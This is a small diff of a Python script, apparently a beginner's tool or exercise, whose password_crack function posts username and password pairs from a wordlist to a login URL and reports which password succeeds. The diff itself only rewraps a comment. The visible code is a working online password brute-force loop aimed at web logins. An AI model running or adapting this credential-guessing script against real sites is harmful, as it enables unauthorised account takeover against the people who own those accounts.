@@ -13,7 +13,8 @@ def password_crack(wordlist, username):
             payload = {"uname": username, "pass": password}
             # This is the payload which delivers the username and password to the website
             request = post(url, data=payload, allow_redirects=False)
-            # this is how our request works with there being a url, payload and make sure that we arent redirected to a different webpage
+            # this is how our request works with there being a url, payload and make sure that we aren't redirected to
+            # a different webpage
             if request.status_code == 200:
                 # this checks if we successfully logged into the website or not
                 print(username + " logged in with " + password)
